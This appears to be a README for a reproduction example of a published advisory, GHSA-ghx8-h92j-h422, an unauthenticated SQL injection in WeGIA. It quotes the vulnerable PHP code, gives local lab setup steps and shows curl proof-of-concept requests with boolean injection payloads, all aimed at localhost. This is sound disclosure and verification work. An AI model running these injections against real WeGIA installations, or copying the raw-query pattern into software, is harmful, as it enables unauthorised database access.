# GHSA-ghx8-h92j-h422

Unauthenticated SQL injection in [WeGIA](https://github.com/LabRedesCefetRJ/WeGIA)
`< 3.2.0` (`CVE-2025-30365`). `html/socio/sistema/controller/query_geracao_auto.php`
`extract()`s the request and runs the attacker-supplied `query` parameter verbatim,
echoing the rows (or `false`) as JSON:

```php
extract($_REQUEST);
$query = mysqli_query($conexao, $query);
while ($resultado = mysqli_fetch_assoc($query)) { $dados[] = $resultado; }
if (isset($dados)) { echo json_encode($dados); } else echo json_encode(false);
```

No session check — fully unauthenticated. This example proves it **boolean-based**:
the injected boolean condition flips the JSON response between a row and `false`,
the classic blind-SQLi oracle. Fixed in `3.2.8` (endpoint discontinued).

Sources:

- https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-ghx8-h92j-h422
- https://github.com/advisories/GHSA-ghx8-h92j-h422

## Reproduce

The endpoint was commented out before the first git tag (3.3.0), so check out the
vulnerable commit directly (the parent of the fix commit, `Issue #825`):

```bash
# MySQL (any database works; the boolean proof uses SELECT 1, not app tables)
docker run -d --name wegia-mysql -e MYSQL_ALLOW_EMPTY_PASSWORD=yes -e MYSQL_DATABASE=wegia \
  -p 127.0.0.1:3306:3306 mysql:8.0
docker exec -i wegia-mysql mysql -uroot -e "CREATE USER IF NOT EXISTS 'wegia'@'%' IDENTIFIED BY 'wegia'; GRANT ALL ON wegia.* TO 'wegia'@'%'; FLUSH PRIVILEGES;"

git clone https://github.com/LabRedesCefetRJ/WeGIA.git
cd WeGIA
git checkout 138435b0          # parent of the SQLi fix; query_geracao_auto.php still live

cat > config.php <<'PHP'
<?php
define('DB_NAME','wegia'); define('DB_USER','wegia');
define('DB_PASSWORD','wegia'); define('DB_HOST','127.0.0.1');
PHP

php -S 127.0.0.1:8990 -t .
```

Manual check:

```bash
E='http://127.0.0.1:8990/html/socio/sistema/controller/query_geracao_auto.php'
curl -s "$E" --data-urlencode 'query=SELECT 1 AS marker WHERE 1=1'   # -> [{"marker":"1"}]
curl -s "$E" --data-urlencode 'query=SELECT 1 AS marker WHERE 1=2'   # -> false
```

In another terminal from the `nocapsec` repo:

```bash
go run ./examples/GHSA-ghx8-h92j-h422
```

The evidence is one `base_request` plus an `injection` slot (`query` form field)
and three payload values (baseline / `WHERE 1=1` / `WHERE 1=2`). The engine builds
all three arms by planting each value into that one slot, replays them (repeated for
stability), and compares response fingerprints on at least `{status, body_hash_fuzzy}`.
A verified report (`true_similar_to_baseline`, `false_differs_from_baseline`) proves
the boolean oracle.
